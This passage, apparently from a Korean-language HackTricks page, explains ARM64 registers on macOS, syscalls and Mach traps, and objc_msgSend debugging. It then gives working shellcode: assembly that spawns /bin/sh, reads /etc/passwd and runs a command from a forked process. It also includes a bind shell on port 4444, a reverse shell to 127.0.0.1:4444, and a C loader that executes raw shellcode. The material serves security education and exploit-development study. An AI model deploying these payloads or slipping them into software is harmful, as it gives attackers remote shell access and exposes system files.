- **모드 및 예외 마스크 비트**(0-4): 현재 실행 상태를 결정합니다. **5번째** 비트는 프로그램이 32비트(1)로 실행되는지 또는 64비트(0)로 실행되는지를 나타냅니다. 나머지 4개는 **현재 사용 중인 예외 모드**를 나타냅니다(예외가 발생하고 처리 중일 때). 설정된 숫자는 **현재 우선 순위**를 나타냅니다.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: 특정 예외는 **`A`**, `I`, `F` 비트를 사용하여 비활성화할 수 있습니다. **`A`**가 1이면 **비동기 중단**이 발생합니다. **`I`**는 외부 하드웨어 **인터럽트 요청**(IRQ)에 응답하도록 구성합니다. F는 **빠른 인터럽트 요청**(FIR)과 관련이 있습니다.

## macOS

### BSD 시스템 호출

[**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)를 확인하세요. BSD 시스템 호출은 **x16 > 0**을 가집니다.

### Mach 트랩

[**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html)에서 `mach_trap_table`을 확인하고, [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h)에서 프로토타입을 확인하세요. Mach 트랩의 최대 수는 `MACH_TRAP_TABLE_COUNT` = 128입니다. Mach 트랩은 **x16 < 0**을 가지므로, 이전 목록의 번호에 **마이너스**를 붙여 호출해야 합니다: **`_kernelrpc_mach_vm_allocate_trap`**는 **`-10`**입니다.

이러한 (및 BSD) 시스템 호출을 호출하는 방법을 찾으려면 **`libsystem_kernel.dylib`**를 디스어셈블러에서 확인할 수 있습니다:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
**Ida**와 **Ghidra**는 캐시를 통과시켜 **특정 dylibs**를 디컴파일할 수 있습니다.

> [!TIP]
> 때때로 **소스 코드**를 확인하는 것보다 **`libsystem_kernel.dylib`**의 **디컴파일된** 코드를 확인하는 것이 더 쉽습니다. 여러 시스템 호출(BSD 및 Mach)의 코드는 스크립트를 통해 생성되기 때문에(소스 코드의 주석을 확인하세요) dylib에서는 호출되는 내용을 찾을 수 있습니다.

### machdep 호출

XNU는 기계 의존적인 호출이라는 또 다른 유형의 호출을 지원합니다. 이러한 호출의 수는 아키텍처에 따라 다르며 호출이나 숫자가 일정하게 유지될 것이라고 보장되지 않습니다.

### comm 페이지

이것은 모든 사용자 프로세스의 주소 공간에 매핑된 커널 소유 메모리 페이지입니다. 사용자 모드에서 커널 공간으로의 전환을 syscalls를 사용하는 것보다 더 빠르게 만들기 위해 설계되었습니다. 이러한 커널 서비스는 너무 많이 사용되기 때문에 이 전환이 매우 비효율적일 수 있습니다.

예를 들어, 호출 `gettimeofdate`는 comm 페이지에서 `timeval`의 값을 직접 읽습니다.

### objc_msgSend

Objective-C 또는 Swift 프로그램에서 이 함수가 사용되는 것을 찾는 것은 매우 일반적입니다. 이 함수는 Objective-C 객체의 메서드를 호출할 수 있게 해줍니다.

매개변수 ([문서에서 더 많은 정보](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> 인스턴스에 대한 포인터
- x1: op -> 메서드의 선택자
- x2... -> 호출된 메서드의 나머지 인수

따라서 이 함수로의 분기 전에 중단점을 설정하면 lldb에서 호출되는 내용을 쉽게 찾을 수 있습니다(이 예제에서 객체는 명령을 실행할 `NSConcreteTask`의 객체를 호출합니다):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> 환경 변수 **`NSObjCMessageLoggingEnabled=1`**를 설정하면 `/tmp/msgSends-pid`와 같은 파일에서 이 함수가 호출될 때 로그를 기록할 수 있습니다.
>
> 또한 **`OBJC_HELP=1`**을 설정하고 이진 파일을 호출하면 특정 Objc-C 작업이 발생할 때 **로그**를 기록하는 데 사용할 수 있는 다른 환경 변수를 볼 수 있습니다.

이 함수가 호출되면, 지정된 인스턴스의 호출된 메서드를 찾아야 하며, 이를 위해 다양한 검색이 수행됩니다:

- 낙관적 캐시 조회 수행:
- 성공하면 완료
- runtimeLock 획득 (읽기)
- If (realize && !cls->realized) 클래스 실현
- If (initialize && !cls->initialized) 클래스 초기화
- 클래스 자체 캐시 시도:
- 성공하면 완료
- 클래스 메서드 목록 시도:
- 발견되면, 캐시를 채우고 완료
- 슈퍼클래스 캐시 시도:
- 성공하면 완료
- 슈퍼클래스 메서드 목록 시도:
- 발견되면, 캐시를 채우고 완료
- If (resolver) 메서드 리졸버 시도, 그리고 클래스 조회에서 반복
- 여전히 여기 있으면 (= 모든 것이 실패했음) 포워더 시도

### Shellcodes

컴파일하려면:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
바이트를 추출하려면:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
신형 macOS의 경우:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>쉘코드를 테스트하는 C 코드</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### 셸

[**여기**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)에서 가져온 내용이며 설명됩니다.

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="리눅스를 위한 adr"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### cat으로 읽기

목표는 `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`를 실행하는 것이며, 두 번째 인수(x1)는 매개변수의 배열입니다(메모리에서 이는 주소의 스택을 의미합니다).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### 포크에서 sh로 명령어 호출하여 메인 프로세스가 종료되지 않도록 하기
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

**포트 4444**에서 [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s)의 Bind shell
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### 리버스 셸

From [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell to **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
